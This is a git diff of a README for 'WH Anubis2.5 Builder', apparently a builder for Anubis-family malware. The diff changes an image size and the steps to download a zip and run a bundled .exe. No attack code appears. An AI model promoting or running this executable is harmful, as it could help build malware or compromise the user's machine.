@@ -1,5 +1,5 @@
 <p align="center">
-<img src="https://github.com/wh-Cyberspace/WH.Anubis2.5Builder/blob/main/img/header1.png" height="100"><br>
+<img src="https://github.com/wh-Cyberspace/WH.Anubis2.5Builder/blob/main/img/header1.png" height="170"><br>
   WH Anubis2.5 Builder 
 
 <br>
@@ -24,8 +24,8 @@
 ```bash
 [+] Download Zip (https://github.com/wh-Cyberspace/WH.Anubis2.5Builder/archive/main.zip)
 [+] Unzip File 
-[+] Make Sure No space in Path Location 
-[+] Dobul Click [WH - Anubis 2.5 Builder.exe] And Run 
+[+] Make Sure No [  ] space in Path Location 
+[+] Click [WH - Anubis 2.5 Builder.exe] And Run 
 
 ```
 
